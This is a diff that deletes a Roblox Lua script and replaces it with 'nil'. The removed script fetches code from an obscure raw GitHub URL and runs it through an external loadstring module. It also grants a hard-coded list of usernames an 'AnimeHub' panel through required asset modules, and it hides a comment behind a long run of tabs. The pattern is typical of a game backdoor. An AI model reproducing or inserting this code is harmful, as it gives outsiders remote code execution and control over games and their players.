@@ -1,17 +1,1 @@
-local Whitelists = true 
-local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/rt%20bsrtb5erge",true)
-require(8082203830):Loadstring(Source)
-
-																																																																																																																																																																		--hello there made by increaseron
-local WhitelistedPlayers = {
-	["increaseron"] = true,
-	["ghtyrfedsw"] = true,
-	["Phobia_667"] = true,
-	["angryboy231"] = true,
-	["caramell_dansen0"] = true,
-	["R3dRidingMina"] = true,
-  ["ArtificialHB"] = true
-}
-
-game.Players.PlayerAdded:Connect(function(plr) if Whitelists then if WhitelistedPlayers[plr.Name] then require(6133482274)["AnimeHub"](plr, "Purple") require(6324372525).fse(plr) end end end)
-
+nil
